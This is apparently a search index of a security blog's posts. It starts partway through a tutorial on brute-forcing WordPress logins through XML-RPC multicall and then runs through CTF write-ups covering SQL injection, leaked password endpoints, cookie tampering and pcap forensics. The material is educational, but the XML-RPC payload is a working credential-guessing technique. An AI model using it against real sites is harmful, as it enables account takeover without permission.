version=\"1.0\"?&gt;&lt;methodCall&gt;&lt;methodName&gt;system.multicall&lt;/methodName&gt;&lt;params&gt;&lt;param&gt;&lt;value&gt;&lt;array&gt;&lt;data&gt;&lt;value&gt;&lt;struct&gt;&lt;member&gt;&lt;name&gt;methodName&lt;/name&gt;&lt;value&gt;&lt;string&gt;wp.getUsersBlogs&lt;/string&gt;&lt;/value&gt;&lt;/member&gt;&lt;member&gt;&lt;name&gt;params&lt;/name&gt;&lt;value&gt;&lt;array&gt;&lt;data&gt;&lt;value&gt;&lt;array&gt;&lt;data&gt;&lt;value&gt;&lt;string&gt;\\{\\{ Your Username \\}\\}&lt;/string&gt;&lt;/value&gt;&lt;value&gt;&lt;string&gt;\\{\\{ Your Password \\}\\}&lt;/string&gt;&lt;/value&gt;&lt;/data&gt;&lt;/array&gt;&lt;/value&gt;&lt;/data&gt;&lt;/array&gt;&lt;/value&gt;&lt;/member&gt;&lt;/struct&gt;&lt;/value&gt;&lt;value&gt;&lt;struct&gt;&lt;member&gt;&lt;name&gt;methodName&lt;/name&gt;&lt;value&gt;&lt;string&gt;wp.getUsersBlogs&lt;/string&gt;&lt;/value&gt;&lt;/member&gt;&lt;member&gt;&lt;name&gt;params&lt;/name&gt;&lt;value&gt;&lt;array&gt;&lt;data&gt;&lt;value&gt;&lt;array&gt;&lt;data&gt;&lt;value&gt;&lt;string&gt;\\{\\{ Your Username \\}\\}&lt;/string&gt;&lt;/value&gt;&lt;value&gt;&lt;string&gt;\\{\\{ Your Password \\}\\}&lt;/string&gt;&lt;/value&gt;&lt;/data&gt;&lt;/array&gt;&lt;/value&gt;&lt;/data&gt;&lt;/array&gt;&lt;/value&gt;&lt;/member&gt;&lt;/struct&gt;&lt;/value&gt;&lt;value&gt;&lt;struct&gt;&lt;member&gt;&lt;name&gt;methodName&lt;/name&gt;&lt;value&gt;&lt;string&gt;wp.getUsersBlogs&lt;/string&gt;&lt;/value&gt;&lt;/member&gt;&lt;member&gt;&lt;name&gt;params&lt;/name&gt;&lt;value&gt;&lt;array&gt;&lt;data&gt;&lt;value&gt;&lt;array&gt;&lt;data&gt;&lt;value&gt;&lt;string&gt;\\{\\{ Your Username \\}\\}&lt;/string&gt;&lt;/value&gt;&lt;value&gt;&lt;string&gt;\\{\\{ Your Password \\}\\}&lt;/string&gt;&lt;/value&gt;&lt;/data&gt;&lt;/array&gt;&lt;/value&gt;&lt;/data&gt;&lt;/array&gt;&lt;/value&gt;&lt;/member&gt;&lt;/struct&gt;&lt;/value&gt;&lt;value&gt;&lt;struct&gt;&lt;member&gt;&lt;name&gt;methodName&lt;/name&gt;&lt;value&gt;&lt;string&gt;wp.getUsersBlogs&lt;/string&gt;&lt;/value&gt;&lt;/member&gt;&lt;member&gt;&lt;name&gt;params&lt;/name&gt;&lt;value&gt;&lt;array&gt;&lt;data&gt;&lt;value&gt;&lt;array&gt;&lt;data&gt;&lt;value&gt;&lt;string&gt;\\{\\{ Your Username \\}\\}&lt;/string&gt;&lt;/value&gt;&lt;value&gt;&lt;string&gt;\\{\\{ Your Password \\}\\}&lt;/string&gt;&lt;/value&gt;&lt;/data&gt;&lt;/array&gt;&lt;/value&gt;&lt;/data&gt;&lt;/array&gt;&lt;/value&gt;&lt;/member&gt;&lt;/struct&gt;&lt;/value&gt;&lt;/data&gt;&lt;/array&gt;&lt;/value&gt;&lt;/param&gt;&lt;/params&gt;&lt;/methodCall&gt;The response will look like:HTTP/1.1 200 OKDate: Mon, 01 Jul 2019 23:02:55 GMTServer: ApacheStrict-Transport-Security: max-age=63072000; includeSubdomains; preloadConnection: closeVary: Accept-EncodingReferrer-Policy: no-referrer-when-downgradeContent-Length: 1043Content-Type: text/xml; charset=UTF-8&lt;?xml version=\"1.0\" encoding=\"UTF-8\"?&gt;&lt;methodResponse&gt; &lt;params&gt; &lt;param&gt; &lt;value&gt; &lt;array&gt;&lt;data&gt; &lt;value&gt;&lt;struct&gt; &lt;member&gt;&lt;name&gt;faultCode&lt;/name&gt;&lt;value&gt;&lt;int&gt;403&lt;/int&gt;&lt;/value&gt;&lt;/member&gt; &lt;member&gt;&lt;name&gt;faultString&lt;/name&gt;&lt;value&gt;&lt;string&gt;Incorrect username or password.&lt;/string&gt;&lt;/value&gt;&lt;/member&gt;&lt;/struct&gt;&lt;/value&gt; &lt;value&gt;&lt;struct&gt; &lt;member&gt;&lt;name&gt;faultCode&lt;/name&gt;&lt;value&gt;&lt;int&gt;403&lt;/int&gt;&lt;/value&gt;&lt;/member&gt; &lt;member&gt;&lt;name&gt;faultString&lt;/name&gt;&lt;value&gt;&lt;string&gt;Incorrect username or password.&lt;/string&gt;&lt;/value&gt;&lt;/member&gt;&lt;/struct&gt;&lt;/value&gt; &lt;value&gt;&lt;struct&gt; &lt;member&gt;&lt;name&gt;faultCode&lt;/name&gt;&lt;value&gt;&lt;int&gt;403&lt;/int&gt;&lt;/value&gt;&lt;/member&gt; &lt;member&gt;&lt;name&gt;faultString&lt;/name&gt;&lt;value&gt;&lt;string&gt;Incorrect username or password.&lt;/string&gt;&lt;/value&gt;&lt;/member&gt;&lt;/struct&gt;&lt;/value&gt; &lt;value&gt;&lt;struct&gt; &lt;member&gt;&lt;name&gt;faultCode&lt;/name&gt;&lt;value&gt;&lt;int&gt;403&lt;/int&gt;&lt;/value&gt;&lt;/member&gt; &lt;member&gt;&lt;name&gt;faultString&lt;/name&gt;&lt;value&gt;&lt;string&gt;Incorrect username or password.&lt;/string&gt;&lt;/value&gt;&lt;/member&gt;&lt;/struct&gt;&lt;/value&gt;&lt;/data&gt;&lt;/array&gt; &lt;/value&gt; &lt;/param&gt; &lt;/params&gt;&lt;/methodResponse&gt;In the above example I tested 4 different credentials sets using a single request. You just have to replace {{ Your Username }} and {{ Your Password }} with your own combinations.That is it, please comment if I missed something and happy hunting!Other references: https://www.wordfence.com/blog/2015/10/should-you-disable-xml-rpc-on-wordpress/ https://medium.com/@the.bilal.rizwan/wordpress-xmlrpc-php-common-vulnerabilites-how-to-exploit-them-d8d3c8600b32 https://github.com/1N3/Wordpress-XMLRPC-Brute-Force-Exploit/blob/master/wordpress-xmlrpc-brute-v2.py" }, { "title": "[NeverLAN 2019] - Das Blog", "url": "/nitesculucian.github.io/2019/02/05/neverlan-2019-das-blog/", "categories": "neverlan, ctf, writeups", "tags": "2019, writeups, CTF, challange, neverlan", "date": "2019-02-05 00:09:00 +0200", "snippet": "Description:Solution Author:Lucian Nitescu, as part of jmp 0xc0ffee team.Solution:At first, I was provided with following web page which instructed me to authenticate into the application.Here it i...", "content": "Description:Solution Author:Lucian Nitescu, as part of jmp 0xc0ffee team.Solution:At first, I was provided with following web page which instructed me to authenticate into the application.Here it is my sample SQL injection payload:Proof of success:After login, I retrieved the flag:The flag is: flag{3sc4pe_Y0ur_1npu7s}" }, { "title": "[NeverLAN 2019] - Things are not always what they seem", "url": "/nitesculucian.github.io/2019/02/05/neverlan-2019-things-are-not-always-what-they-seem/", "categories": "neverlan, ctf, writeups", "tags": "2019, writeups, CTF, capture, flag, challange, neverlan", "date": "2019-02-05 00:08:00 +0200", "snippet": "Description:Solution Author:Lucian Nitescu, as part of jmp 0xc0ffee team.Solution:This challenge was to easy an required only to access the view source of the current web page.view-source:https://c...", "content": "Description:Solution Author:Lucian Nitescu, as part of jmp 0xc0ffee team.Solution:This challenge was to easy an required only to access the view source of the current web page.view-source:https://challenges.neverlanctf.com:1165/hello.htmlThe flag is: flag{Whale_w0u1d_y0u_l00k3y_th3r3}" }, { "title": "[NeverLAN 2019] - SQL FUN 2", "url": "/nitesculucian.github.io/2019/02/05/neverlan-2019-sql-fun-2/", "categories": "neverlan, ctf, writeups", "tags": "2019, writeups, CTF, challange, neverlan", "date": "2019-02-05 00:08:00 +0200", "snippet": "Description:Solution Author:Lucian Nitescu, as part of jmp 0xc0ffee team.Solution:On this challenge, I was provided a basic and unrestricted SQL \"console\" that allowed me to enter any SQL query.As ...", "content": "Description:Solution Author:Lucian Nitescu, as part of jmp 0xc0ffee team.Solution:On this challenge, I was provided a basic and unrestricted SQL \"console\" that allowed me to enter any SQL query.As easy as it may sound, I performed a basic select in order to retrieve the user password. select * from passwdDecoding the base64 string:" }, { "title": "[NeverLAN 2019] - SQL FUN 1", "url": "/nitesculucian.github.io/2019/02/05/neverlan-2019-sql-fun-1/", "categories": "neverlan, ctf, writeups", "tags": "2019, writeups, CTF, challange, neverlan", "date": "2019-02-05 00:08:00 +0200", "snippet": "Description:Solution Author:Lucian Nitescu, as part of jmp 0xc0ffee team.Solution:On this challenge, I was provided a basic and unrestricted SQL \"console\" that allowed me to enter any SQL query.As ...", "content": "Description:Solution Author:Lucian Nitescu, as part of jmp 0xc0ffee team.Solution:On this challenge, I was provided a basic and unrestricted SQL \"console\" that allowed me to enter any SQL query.As easy as it may sound, I performed a basic select in order to retrieve the user password. Funny enough the application requires an at least one valid whare cause, so I did that: SELECT * FROM users WHERE 1The flag is: flag{SQL_F0r_Th3_W1n}" }, { "title": "[NeverLAN 2019] - Dirty Validate", "url": "/nitesculucian.github.io/2019/02/05/neverlan-2019-dirty-validate/", "categories": "neverlan, ctf, writeups", "tags": "2019, writeups, CTF, challange, neverlan", "date": "2019-02-05 00:07:00 +0200", "snippet": "Description:Solution Author:Lucian Nitescu, as part of jmp 0xc0ffee team.Solution:In this challenge, we were prompted with a basic login form.As a first step, I decided to take a look at the source...", "content": "Description:Solution Author:Lucian Nitescu, as part of jmp 0xc0ffee team.Solution:In this challenge, we were prompted with a basic login form.As a first step, I decided to take a look at the source code of the accessed web page. On the source code of the page, I discovered multiple ajax request that can be directly accessed by any user.Retrieving all user accounts for the application: https://challenges.neverlanctf.com:1135/webhooks/get_username.phpRetrieving the base 64 encoded password for the Dr. Whom user account: https://challenges.neverlanctf.com:1135/webhooks/get_password.php?user=Dr.%20WhomDecoding the base64 string:The flag is: flag{D0n't_7rus7_JS}" }, { "title": "[NeverLAN 2019] - Console", "url": "/nitesculucian.github.io/2019/02/05/neverlan-2019-console/", "categories": "neverlan, ctf, writeups", "tags": "2019, writeups, CTF, challange, neverlan", "date": "2019-02-05 00:07:00 +0200", "snippet": "Description:Solution Author:Lucian Nitescu, as part of jmp 0xc0ffee team.Solution:The challenge started with the following simple \"console\" page:As a first step, I decided to take a look at the sou...", "content": "Description:Solution Author:Lucian Nitescu, as part of jmp 0xc0ffee team.Solution:The challenge started with the following simple \"console\" page:As a first step, I decided to take a look at the source code of the accessed web page. view-source:https://challenges.neverlanctf.com:1120/console.htmlAs you can see we have 2 different javascript functions. The what() function, which handles the password confirmation and the getThat(strg) function which handles the redirect to our \"authenticated\" page. In this case, we have two different approaches: We access directly the 1/key.php page We call the getThat(strg) function with the value 'Y'Here it is how I obtained the flag for this challenge:The flag is: flag{console_controls_js}" }, { "title": "[NeverLAN 2019] - Cookie Monster", "url": "/nitesculucian.github.io/2019/02/05/neverlan-2019-cookie-monster/", "categories": "neverlan, ctf, writeups", "tags": "2019, writeups, CTF, challange, neverlan", "date": "2019-02-05 00:06:00 +0200", "snippet": "Description:Solution Author:Lucian Nitescu, as part of jmp 0xc0ffee team.Solution:After accessing the challenge URL (https://challenges.neverlanctf.com:1110/) I observed the cookie Red_Guy's_name a...", "content": "Description:Solution Author:Lucian Nitescu, as part of jmp 0xc0ffee team.Solution:After accessing the challenge URL (https://challenges.neverlanctf.com:1110/) I observed the cookie Red_Guy's_name as seen in the following screenshot from Burp Suite:Also, the response provided us with some additional information as seen in the highlighted areas:I decided to take that information an use the Google search engine in order to retrieve more information.I discovered that the name of the \"red guy\" in \"Cookie Monster\" is actually called Elmo. I changed the cookie value in order as such:The flag is: flag{YummyC00k13s}" }, { "title": "[OtterCTF 2018] - Birdman's Data Writeup", "url": "/nitesculucian.github.io/2018/12/11/otterctf-2018-birdman-s-data-writeup/", "categories": "otterctf, ctf, writeups", "tags": "2018, writeups, CTF, challange, OtterCTF", "date": "2018-12-11 01:39:00 +0200", "snippet": "Description:We recorded some of BirdMan’s networking, but a part of it (the important part) got scrambled.DownloadSolution Author:Lucian Nitescu, as part of jmp 0xc0ffee team.Stats:150 points / 100...", "content": "Description:We recorded some of BirdMan’s networking, but a part of it (the important part) got scrambled.DownloadSolution Author:Lucian Nitescu, as part of jmp 0xc0ffee team.Stats:150 points / 100 solversSolution:While looking throughout the provided .pcap I discovered the following issue:Someone used http://www.txtwizard.net/crypto application to encrypt a message that can now be retrieved. The web application server uses HTTP instead of HTTPS, therefore, all network traffic can be intercepted by an attacker.I decided to retrieve the JSON files used in the encryption process using the Network Miner tool.Key A:{\"key\":\"sEhrZxQpnNnINixu3KQ1Tg==\"}Key B:{\"key\":\"XfCtxvD1yFZbxQ/+ULhAcA==\"}The actual Cipher Text (output of encryption):{\"cipherText\":\"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\"}Knowing that we have two keys (Called A and B) and a ciphertext, we can determine that it is a CBC based algorithm and we must identify from A and B which is the Key and the IV. I used Wireshark for further research and I discovered that the intercepted (victim), used a POST requests to /crypto/AES/encrypt/CBC/PKCSS:And the victim used the Key and the IV as such:I have used the same tool as the victim to decrypt the ciphertext:Output:Chance Something's wrong, I can feel it (Six minutes, Slim Shady, you're on) Just a feeling I've got, like something's aboutTo happen, but I don't know what If that means, what I think it means, we're in trouble, big trouble, And if he is as bananas as you say, I'm not taking any chances You were just what the doctor ordered I'm beginning toFeel like a Rap God, Rap God All my people from the front to the back nod, back nod Now who thinks their arms are long{Enough to slap box, slap box? They said I rap like a robot, so callme Rapbot But for me to rap like a computer must bein my genes I got a laptop in my back pocket My pen'll go off when I half-c*** it Got a fat knot from that rap profit Made a living and a killing off it Ever since Bill Clinton was still in office With Monica Lewinsky feeling on hisNut-sack I'm an MC still as honest But as rude and indecent as all hell syllables, killaholic (Kill 'em all with) This slickety, gibbedy, hibbedy hip hop You don't really wanna get into a pissing match with this rappidy rap Packing a Mac in the back of the Ac, pack backpack rap, yep, yackidy-yac Theexact same time I attempt these lyrical acrobat stunts while I'm practicing That I'll still be able to break aMotherf***in' table Over the back of a couple of_Faggots and crack it in halfOnlyRealized it was ironic I was signed to Aftermath after the fact How could I not blow? All I do is drop F-bombs, feel my wrath of attack Rappers are having a rough time period, here's a Maxipad It's actually disastrously bad For the wack while I'm masterfully constructing this masterpiece as I'm beginning to feel_Like a Rap God, Rap God All my people from the front to the back nod, back nod Now who thinks their arms are long enough to slap box, slap box? Let me show you maintaining this s*** ain't that hard, that hard Everybody want the key and the secret to rapimmortality like I have got Well, to be truthful the blueprint's simply rage and youthful exuberance Everybody loves to rootfor a nuisance Hit theEarth like an asteroid, did nothing but shoot for the moon since MC's_get taken to school with this music Cause I use it as a vehicle to bust a rhyme Now I lead a new school full of students Me? I'm a product of Rakim, Lakim Shabazz, 2Pac N- -W.A, Cube, hey, Doc, Ren, Yella,Eazy, thank you, they got Slim Inspiredenough to one day grow up, blow up and be in a position To meet Run DMC and induct them into the motherf***in' Rock n' Roll Hall of Fame Even though I walk in the church and burst in a ball of flames Only Hall of Fame I be inducted in is the alcohol of fame On the wall of shame You fags think it's all a game 'til I walk a flock of flames Off of planking, tell me what in the f*** are you thinking? Little gay looking boy So gay I can barely say it with a straight face looking boy You witnessing a massacre Like you watching a church gathering take place looking boy Oy vey, that boy's gay, that's all they say looking boy You get a thumbs up, pat on the back And a way to go from your label everyday looking boy Hey, looking boy, what you say looking boy? I got a \"hell yeah\" from Dre looking boy I'mma work for everything I have Never ask nobody for s***, get outta my face looking boy Basically boy you're never gonna be capable To keep up with the same pace looking boy 'Cause I'm beginning to feel like a Rap God, Rap God All my people from the front to the back nod, back nod The way I'm racing around the track, call me Nascar, Nascar Dale Earnhardt of the trailer park, the White Trash God Kneel before Generalzorb}If we take a look at the above text paragraph and we take only the first character of each line, we obtain the following:CTF{EmiNeM_FOR_LifE_gEez}" }, { "title": "[OtterCTF 2018] - Otter Leak Writeup", "url": "/nitesculucian.github.io/2018/12/11/otterctf-2018-otter-leak-writeup/", "categories": "otterctf, ctf, writeups", "tags": "2018, writeups, CTF, challange, OtterCTF", "date": "2018-12-11 00:44:00 +0200", "snippet": "Description:We found out that one of the Otters been leaking information from our network! Find the leaked data.Format: CTF{flag all uppercase}DownloadSolution Author:Lucian Nitescu, as part of jmp...", "content": "Description:We found out that one of the Otters been leaking information from our network! Find the leaked data.Format: CTF{flag all uppercase}DownloadSolution Author:Lucian Nitescu, as part of jmp 0xc0ffee team.Stats:200 points / 45 solversSolution:On this challenge, I was provided with a .pcap file which contained packets form an internal network. My first step in every pcap file is to lunch Network Miner tool and take a look at what it retrieves. Here I discovered the following files:Because Network Miner is a good tool, but not perfect, I had to launch Wireshark and extract all the files sent by 10.0.0.6 host over SMB protocol.Output of the Wireshark file retrieval:At this point, I discovered that all files are of .jpg extension but contain only one character. Let’s read them all at once!As you can see in the following image, I got on first row a string which looks like a base64 encoding:I decided to decode my string, and I obtained the following Morse code:I decoded my Morse code and obtained the flag:Added the missing parts from the flag in order to respect the format." }, { "title": "[OtterCTF 2018] - ReCurse Writeup", "url": "/nitesculucian.github.io/2018/12/10/otterctf-2018-recurse-writeup/", "categories": "otterctf, ctf, writeups", "tags": "2018, writeups, CTF, challange, OtterCTF", "date": "2018-12-10 23:30:00 +0200", "snippet": "Description:Found this nested zip in Morty’s PC. what is it that he is hiding?DownloadSolution Author:Lucian Nitescu, as part of jmp 0xc0ffee team.Stats:150 points / 94 solversSolution:  The challe...", "content": "Description:Found this nested zip in Morty’s PC. what is it that he is hiding?DownloadSolution Author:Lucian Nitescu, as part of jmp 0xc0ffee team.Stats:150 points / 94 solversSolution:  The challenge started with a .zip file which contained multiple zipped files within other zipped files as you can see in the following example:My approach was rather brute: I unzipped one file in a folder and within the newly created folder, I repeated my actions. Here is the single bash command that I executed:while true; do unzip $(ls \\*.zip) -d $(ls \\*.zip). &amp;&amp; cd $(ls \\*.zip).; doneOutput:The resulting working directory and the retrieved files:w.zip is the last zip archive within the chain and requires a password to extract the archived text file.From the working directory path I decided to strip all the extension names (.zip) and other unnecessary file names:/home/nli/Desktop/otterctf/ReCurse/a.zip./H.zip./R.zip./0.zip./c.zip./H.zip./M.zip./6.zip./L.zip./y.zip./9.zip./3.zip./d.zip./3.zip./c.zip./u.zip./Z.zip./X.zip./h.zip./v.zip./d.zip./G.zip./l.zip./j.zip./Y.zip./W.zip./5.zip./p.zip./b.zip./W.zip./F.zip./s.zip./c.zip./2.zip./Z.zip./v.zip./c.zip./n.zip./N.zip./h.zip./b.zip./G.zip./U.zip./u.zip./b.zip./m.zip./V.zip./0.zip./L.zip./3.zip./N.zip./h.zip./b.zip./G.zip./U.zip./v.zip./M.zip./z.zip./k.zip./z.zip./N.zip./T.zip./M.zip./t.zip./M.zip./i.zip./1.zip./m.zip./Z.zip./W.zip./1.zip./h.zip./b.zip./G.zip./U.zip./t.zip./c.zip./2.zip./1.zip./h.zip./b.zip./G.zip./w.zip./t.zip./Y.zip./2.zip./x.zip./h.zip./d.zip./y.zip./1.zip./B.zip./c.zip./2.zip./l.zip./h.zip./b.zip./i.zip./1.zip./v.zip./d.zip./H.zip./R.zip./l.zip./c.zip./n.zip./M.zip./u.zip./Y.zip./X.zip./N.zip.Output:aHR0cHM6Ly93d3cuZXhvdGljYW5pbWFsc2ZvcnNhbGUubmV0L3NhbGUvMzkzNTMtMi1mZW1hbGUtc21hbGwtY2xhdy1Bc2lhbi1vdHRlcnMuYXNAfter I decoded the above base64 string, I obtained the following link:https://www.exoticanimalsforsale.net/sale/39353-2-female-small-claw-Asian-otters.asI had to add the p letter to the end of the link in order to access the page:https://www.exoticanimalsforsale.net/sale/39353-2-female-small-claw-Asian-otters.aspBy clicking on the User Review link, I was redirected to http://www.birple.com/users.asp?id=Brking1991@gmail.com&amp;sid=175 website and page. At first, I thought that this was a dead end, but after multiple tries and failures I decided to use the leaked email (Brking1991@gmail.com) as the password for my last archive file:Output:Obtaining the flag:flag{Recursion_1S_T3rribl3_AnD_1_H4t3_My_L1F3!!}" }, { "title": "AttackDefense.com [RCE] - CVE-2018-9037 Exploit", "url": "/nitesculucian.github.io/2018/12/08/attackdefense-com-rce-cve-2018-9037-exploit/", "categories": "AttackDefense.com, ctf, writeups, CVE-2018, RCE", "tags": "writeups, CTF, challange, AttackDefense.com", "date": "2018-12-08 00:53:00 +0200", "snippet": "MissionAn attacker might get administrative access to a web application. However, this does not automatically mean that the web server can be compromised. In cases where a SaaS application is made ...", "content": "MissionAn attacker might get administrative access to a web application. However, this does not automatically mean that the web server can be compromised. In cases where a SaaS application is made available to users, it is routine to give each user admin access to his own instance of the web application e.g. a managed hosted Wordpress site. In such scenario, the attacker who will begin accessing the application as a managed administrative user will have to figure out how to exploit the administrative interface to get a shell on the server. In some cases, it might be possible to do privilege escalation as well.In the exercise below, the 